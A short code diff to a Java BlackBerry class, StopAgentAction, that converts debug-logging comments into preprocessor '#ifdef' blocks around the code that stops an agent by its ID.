@@ -1,3 +1,4 @@
+//#preprocess
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
@@ -39,8 +40,9 @@ public final class StopAgentAction extends SubAction {
      * @see blackberry.action.SubAction#execute(blackberry.event.Event)
      */
     public boolean execute(final Event triggeringEvent) {
-        // #debug info
+        //#ifdef DEBUG_INFO
         debug.info("Stopping " + agentId);
+        //#endif
         final AgentManager agentManager = AgentManager.getInstance();
 
         final boolean ret = agentManager.stop(agentId);
@@ -58,12 +60,14 @@ public final class StopAgentAction extends SubAction {
 
         try {
             agentId = databuffer.readInt();
-            // #debug info
+            //#ifdef DEBUG_INFO
             debug.info("agentId: " + agentId);
+            //#endif
 
         } catch (final EOFException e) {
-            // #debug
+            //#ifdef DEBUG
             debug.error("params FAILED");
+            //#endif
             return false;
         }
 
